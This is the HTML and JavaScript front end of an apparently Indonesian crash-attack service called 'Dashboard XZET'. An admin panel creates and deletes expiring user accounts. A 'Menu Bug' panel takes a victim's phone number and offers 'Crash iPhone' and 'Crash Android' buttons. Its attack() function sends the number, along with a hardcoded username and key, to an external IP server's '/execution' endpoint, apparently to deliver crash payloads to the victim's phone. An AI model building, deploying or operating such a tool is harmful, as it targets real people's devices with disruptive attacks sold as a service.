<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Dashboard XZET</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="top-bar">
    <span id="welcome"></span>
    <button onclick="logout()">Logout</button>
  </div>

  <div id="adminPanel" class="hidden">
    <h2>ðŸ‘‘ Admin Panel</h2>
    <div>
      <input type="text" id="newUser" placeholder="Username baru" />
      <input type="text" id="newPass" placeholder="Password baru" />
      <input type="number" id="newExpire" placeholder="Expired (hari)" />
      <button onclick="createUser()">Create User</button>
    </div>
    <h3>Daftar User</h3>
    <table id="userTable">
      <thead>
        <tr><th>Username</th><th>Role</th><th>Expired</th><th>Aksi</th></tr>
      </thead>
      <tbody></tbody>
    </table>
  </div>

  <div id="userPanel" class="hidden">
    <h2>ðŸ’¥ Menu Bug</h2>
    <input type="text" id="target" placeholder="Masukkan nomor target 62xxxx" />
    <button onclick="attack('ios')">Crash iPhone</button>
    <button onclick="attack('andros')">Crash Android</button>
  </div>

  <script>
    const role = localStorage.getItem("role");
    const username = localStorage.getItem("username");

    if (!role || !username) window.location.href = "/";

    document.getElementById("welcome").textContent = `Halo, ${username} (${role})`;

    if (role === "admin") {
      document.getElementById("adminPanel").classList.remove("hidden");
      loadUsers();
    } else {
      document.getElementById("userPanel").classList.remove("hidden");
    }

    async function loadUsers() {
      const res = await fetch("/api/getUsers");
      const users = await res.json();
      const tbody = document.querySelector("#userTable tbody");
      tbody.innerHTML = "";
      users.forEach(u => {
        const tr = document.createElement("tr");
        tr.innerHTML = `
          <td>${u.username}</td>
          <td>${u.role}</td>
          <td>${u.expired ? new Date(u.expired).toLocaleDateString() : "-"}</td>
          <td><button onclick="deleteUser('${u.username}')">Hapus</button></td>
        `;
        tbody.appendChild(tr);
      });
    }

    async function createUser() {
      const username = document.getElementById("newUser").value.trim();
      const password = document.getElementById("newPass").value.trim();
      const days = parseInt(document.getElementById("newExpire").value.trim() || "7");
      const expiredDate = new Date();
      expiredDate.setDate(expiredDate.getDate() + days);

      const res = await fetch("/api/updateUsers", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "create", username, password, expired: expiredDate })
      });

      if (res.ok) loadUsers();
    }

    async function deleteUser(user) {
      await fetch("/api/updateUsers", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "delete", username: user })
      });
      loadUsers();
    }

    function logout() {
      localStorage.clear();
      window.location.href = "/";
    }

    async function attack(mode) {
      const target = document.getElementById("target").value.trim();
      if (!target.startsWith("62")) return alert("Nomor harus 62xxxx");
      const url = `http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`;
      await fetch(url);
      alert(`Berhasil kirim bug ke ${target} (${mode})`);
    }
  </script>
</body>
</html>
